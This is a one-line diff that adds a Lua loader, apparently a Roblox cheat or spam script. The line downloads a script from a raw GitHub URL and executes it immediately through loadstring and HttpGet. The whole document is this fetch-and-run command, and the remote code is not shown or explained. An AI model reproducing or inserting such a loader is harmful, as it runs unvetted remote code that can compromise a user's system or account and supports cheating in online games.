@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/the-eternal-abyss-spam5-6jooila9l5dcq3.lua"))()
